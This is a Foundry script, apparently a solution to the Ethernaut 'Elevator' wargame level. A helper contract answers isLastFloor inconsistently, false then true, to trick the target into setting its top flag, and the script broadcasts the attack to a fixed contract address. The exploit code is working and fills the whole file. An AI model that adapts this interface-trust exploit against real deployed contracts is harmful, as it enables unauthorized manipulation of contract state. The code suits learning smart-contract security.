// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/11_Elevator.sol";

contract Helper {
    uint256 public count;
    Elevator public target;

    constructor (Elevator _target) {
        target = _target;
    }

    function exploit() external {
        target.goTo(1);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (count == 0) {
            count += _floor;
            return false;
        } else {
            return true;
        }
    }
}

contract POC is Script {
    Elevator public target;
    Helper public helper;

    function setUp() external {
        target = Elevator(0x77fE5244A0e6D86038502E65Cb0875e1C0CBcbc1);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bool top = target.top();
        console.log("before status: ", top);

        helper = new Helper(target);
        helper.exploit();

        top = target.top();
        console.log("after  status: ", top);
        vm.stopBroadcast();
    }

}